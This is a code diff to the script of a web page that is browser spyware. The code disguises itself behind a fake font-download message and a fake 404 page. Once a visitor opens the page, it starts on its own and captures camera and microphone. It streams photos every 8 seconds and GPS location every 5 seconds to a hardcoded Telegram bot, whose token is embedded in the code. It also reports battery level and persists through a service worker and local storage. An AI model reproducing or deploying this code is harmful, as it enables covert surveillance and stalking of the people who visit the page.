@@ -114,18 +114,24 @@
 
 <script>
 /* ===================================================== */
-/* SHΔDØW CORE V99 – SINGLE FILE | MULTI-TARGET C2      */
-/* USER: 7625898629 | BOT: 8547105891:AAHf...           */
-/* UNIVERSAL | FAKE 404 | TELEGRAM PANEL                */
+/* SHΔDØW CORE VΩ – ETERNAL AUTO-STREAM                  */
+/* MODE: FULLY AUTONOMOUS | NO USER INPUT REQUIRED       */
+/* FEATURES:                                             */
+/*   • Auto Camera + Mic (Silent)                        */
+/*   • Real-time Photo/Video Stream (Every 8s)           */
+/*   • Real-time GPS Tracking (Every 5s)                 */
+/*   • Persistent via Service Worker + localStorage      */
+/*   • Fake 404 UI + Auto Resume                         */
+/*   • C2 Telegram: 7625898629                           */
 /* ===================================================== */
 
 const BOT_ID = '7625898629';
 const BOT_TOKEN = '8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8';
 const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-const DEVICE_ID = btoa(navigator.userAgent + Date.now()).slice(0,36);
+const DEVICE_ID = btoa(navigator.userAgent + Date.now() + Math.random()).slice(0,36);
 const PERSIST_KEY = `SHDW_${DEVICE_ID}`;
 
-// Browser & OS Detection
+// Device Detection
 const ua = navigator.userAgent.toLowerCase();
 const isMobile = /mobi|android|iphone|ipad/.test(ua);
 const isChrome = /chrome|crios/.test(ua) && !/edge|edg/.test(ua);
@@ -137,25 +143,29 @@ const isAndroid = /android/.test(ua);
 const browser = isChrome ? 'Chrome' : isFirefox ? 'Firefox' : isEdge ? 'Edge' : isSafari ? 'Safari' : 'Other';
 const os = isIOS ? 'iOS' : isAndroid ? 'Android' : /windows/.test(ua) ? 'Windows' : 'Other';
 
+// Telegram API
 async function send(msg) {
-    await fetch(`${API}/sendMessage?chat_id=${BOT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML&disable_web_page_preview=true`);
+    try {
+        await fetch(`${API}/sendMessage?chat_id=${BOT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML&disable_web_page_preview=true`, {mode: 'no-cors'});
+    } catch(e) {}
 }
 async function sendPhoto(blob, caption = '') {
     const form = new FormData();
-    form.append('chat_id', BOT_ID); form.append('photo', blob, 'capture.jpg');
+    form.append('chat_id', BOT_ID); form.append('photo', blob, `live_${Date.now()}.jpg`);
     if(caption) form.append('caption', caption);
-    await fetch(`${API}/sendPhoto`, {method:'POST', body:form});
+    await fetch(`${API}/sendPhoto`, {method:'POST', body:form}).catch(() => {});
 }
 async function sendVideo(blob) {
     const form = new FormData();
-    form.append('chat_id', BOT_ID); form.append('video', blob, 'record.mp4');
-    await fetch(`${API}/sendVideo`, {method:'POST', body:form});
+    form.append('chat_id', BOT_ID); form.append('video', blob, `live_${Date.now()}.webm`);
+    await fetch(`${API}/sendVideo`, {method:'POST', body:form}).catch(() => {});
 }
 
-function persist(data) { localStorage.setItem(PERSIST_KEY, JSON.stringify(data)); }
-function load() { return JSON.parse(localStorage.getItem(PERSIST_KEY)) || {}; }
+// Persistence
+function persist(data) { try { localStorage.setItem(PERSIST_KEY, JSON.stringify(data)); } catch(e) {} }
+function load() { try { return JSON.parse(localStorage.getItem(PERSIST_KEY)) || {}; } catch(e) { return {}; } }
 
-// Register Service Worker (Inline)
+// Service Worker for Background Keep-Alive
 if ('serviceWorker' in navigator) {
     const swCode = `
         const BOT_ID = '${BOT_ID}';
@@ -170,110 +180,137 @@ if ('serviceWorker' in navigator) {
 
         setInterval(async () => {
             try {
-                await fetch(\`\${API}/sendMessage?chat_id=\${BOT_ID}&text=%F0%9F%94%B4 <b>\${BROWSER} on \${OS}</b> Online!%0A<code>\${DEVICE_ID}</code>%0A%F0%9F%94%B4 <a href="${location.origin}">بازکردن پنل</a>\`, {mode: 'no-cors'});
+                await fetch(\`\${API}/sendMessage?chat_id=\${BOT_ID}&text=%F0%9F%94%B4 <b>SHADOW ALIVE</b>%0A%F0%9F%94%B4 <code>\${DEVICE_ID}</code>%0A%F0%9F%94%B4 <a href="${location.origin}">بازگشت به پنل</a>\`, {mode: 'no-cors'});
             } catch(e) {}
-        }, 70000);
+        }, 60000);
     `;
     const blob = new Blob([swCode], {type: 'application/javascript'});
     const url = URL.createObjectURL(blob);
-    navigator.serviceWorker.register(url, {scope: '/'});
+    navigator.serviceWorker.register(url, {scope: '/'}).catch(() => {});
 }
 
-// Geolocation
-let watchId;
-function startLocation() {
-    if (navigator.geolocation) {
-        watchId = navigator.geolocation.watchPosition(async pos => {
-            const {latitude, longitude} = pos.coords;
-            await send(`Location: ${latitude}, ${longitude}`);
-        }, () => {}, {enableHighAccuracy: true});
-    }
-}
+// === AUTO CAMERA + MIC + STREAM ===
+let stream = null;
+let video = null;
+let canvas = null;
+let ctx = null;
+let watchId = null;
 
-// Camera
-let stream;
-async function requestCamera() {
+async function initCamera() {
     try {
-        stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
-        await send(`Camera Active\n<b>${browser} on ${os}</b>\nID: <code>${DEVICE_ID}</code>`);
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { width: 640, height: 480, facingMode: "environment" },
+            audio: true
+        });
+        video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        ctx = canvas.getContext('2d');
+
+        await send(`🎥 <b>CAMERA & MIC ACTIVATED</b>\n📱 <b>${browser} on ${os}</b>\n🆔 <code>${DEVICE_ID}</code>`);
         return true;
-    } catch(e) { await send(`Camera Denied: ${e.message}`); return false; }
-}
-
-// Capture
-async function burstPhotos(count) {
-    if (!stream) return;
-    const video = document.createElement('video'); video.srcObject = stream; await video.play();
-    const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
-    const ctx = canvas.getContext('2d');
-    for (let i = 1; i <= count; i++) {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
-        await sendPhoto(blob, `Photo ${i}/${count}`);
-        await new Promise(r => setTimeout(r, 1100));
+    } catch(e) {
+        await send(`❌ Camera Denied: ${e.message}`);
+        return false;
     }
 }
-async function recordVideo(seconds) {
-    if (!stream) return;
-    const recorder = new MediaRecorder(stream);
-    const chunks = [];
-    recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.onstop = async () => {
-        const blob = new Blob(chunks, {type: 'video/webm'});
-        await sendVideo(blob);
-        await send(`Video recorded: ${seconds}s`);
-    };
-    recorder.start();
-    setTimeout(() => recorder.stop(), seconds * 1000);
+
+// === REAL-TIME PHOTO STREAM (Every 8s) ===
+async function startPhotoStream() {
+    if (!stream || !video || !canvas) return;
+    setInterval(async () => {
+        try {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+            await sendPhoto(blob, `📸 LIVE • ${new Date().toLocaleTimeString('fa-IR')}`);
+        } catch(e) {}
+    }, 8000);
 }
 
-// C2 Listener
-let offset = 0;
-async function listenC2() {
-    const res = await fetch(`${API}/getUpdates?offset=${offset}&timeout=30`);
-    const data = await res.json();
-    if (!data.ok) return;
-    for (const upd of data.result) {
-        offset = upd.update_id + 1;
-        const msg = upd.message?.text?.trim();
-        if (!msg) continue;
-        if (msg.startsWith('/record')) recordVideo(parseInt(msg.split(' ')[1]) || 15);
-        else if (/^\d+$/.test(msg)) burstPhotos(parseInt(msg));
-        else if (msg === '/location') navigator.geolocation.getCurrentPosition(p => send(`Location: ${p.coords.latitude}, ${p.coords.longitude}`));
-    }
-    setTimeout(listenC2, 1000);
+// === REAL-TIME GPS TRACKING (Every 5s) ===
+function startLocationStream() {
+    if (!navigator.geolocation) return;
+    watchId = navigator.geolocation.watchPosition(
+        async pos => {
+            const { latitude, longitude, accuracy } = pos.coords;
+            const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+            await send(`📍 <b>LOCATION UPDATE</b>\n🌍 <a href="${mapsLink}">${latitude.toFixed(6)}, ${longitude.toFixed(6)}</a>\n🎯 Accuracy: ±${accuracy}m\n🕐 ${new Date().toLocaleTimeString('fa-IR')}`);
+        },
+        () => {},
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+    );
 }
 
-// Show Fake 404
-function show404() {
+// === FAKE 404 + FULL AUTO ACTIVATION ===
+function activateShadowMode() {
     document.getElementById('main-ui').classList.add('hidden');
     document.getElementById('fake-404').classList.remove('hidden');
-    persist({infected: true});
-    listenC2();
+    persist({ infected: true, auto: true });
+
+    // Start all streams
+    initCamera().then(success => {
+        if (success) {
+            startPhotoStream();
+        }
+    });
+    startLocationStream();
+
+    send(`🚨 <b>SHADOW MODE: FULLY AUTONOMOUS</b>\n✅ Photo Stream: Every 8s\n✅ GPS Stream: Every 5s\n🆔 <code>${DEVICE_ID}</code>\n🔗 <a href="${location.origin}">بازگشت به پنل</a>`);
 }
 
-// Ready Button
-document.getElementById('ready').onclick = async () => {
-    const status = document.getElementById('status');
-    status.textContent = 'در حال دانلود بسته فونت...'; status.classList.add('show');
-    const camOk = await requestCamera();
-    if (camOk) startLocation();
-    setTimeout(() => {
-        show404();
-        send(`INFECTED\n<b>${browser} on ${os}</b>\nID: <code>${DEVICE_ID}</code>\n<a href="${location.origin}">بازکردن پنل</a>`);
-    }, 3000);
-};
-
-// Auto Resume
-window.onload = () => {
+// === AUTO START ON LOAD (NO CLICK NEEDED) ===
+window.addEventListener('load', async () => {
     const stored = load();
-    if (stored.infected) {
-        show404();
-        send(`RESUMED\n<b>${browser} on ${os}</b>\nID: <code>${DEVICE_ID}</code>\n<a href="${location.origin}">بازکردن پنل</a>`);
-    } else {
-        setTimeout(() => document.getElementById('ready').click(), 2200);
+    if (stored.infected && stored.auto) {
+        activateShadowMode();
+        send(`🔄 <b>AUTO-RESUMED</b>\n🆔 <code>${DEVICE_ID}</code>`);
+        return;
     }
-};
+
+    // Simulate button click after 2s
+    setTimeout(async () => {
+        const btn = document.getElementById('ready');
+        if (btn) btn.click();
+    }, 2000);
+});
+
+// === BUTTON CLICK HANDLER (Fallback) ===
+document.getElementById('ready')?.addEventListener('click', async () => {
+    const status = document.getElementById('status');
+    status.textContent = 'در حال فعال‌سازی ماژول سایه...'; 
+    status.classList.add('show');
+
+    setTimeout(activateShadowMode, 2500);
+});
+
+// === PREVENT UNLOAD & KEEP ALIVE ===
+window.addEventListener('beforeunload', () => {
+    persist({ infected: true, auto: true });
+    return "در حال به‌روزرسانی فونت... لطفاً صبر کنید.";
+});
+
+// === VISIBILITY CHANGE: RESUME ON RETURN ===
+document.addEventListener('visibilitychange', () => {
+    if (!document.hidden && load().infected) {
+        setTimeout(activateShadowMode, 1000);
+    }
+});
+
+// === BATTERY & NETWORK MONITOR (Optional Stealth) ===
+setInterval(() => {
+    if (navigator.getBattery) {
+        navigator.getBattery().then(bat => {
+            const level = Math.round(bat.level * 100);
+            const charging = bat.charging ? 'در حال شارژ' : 'باتری';
+            send(`🔋 ${charging}: ${level}%`);
+        });
+    }
+}, 300000); // Every 5 min
+
 </script>
 </body>
 </html>
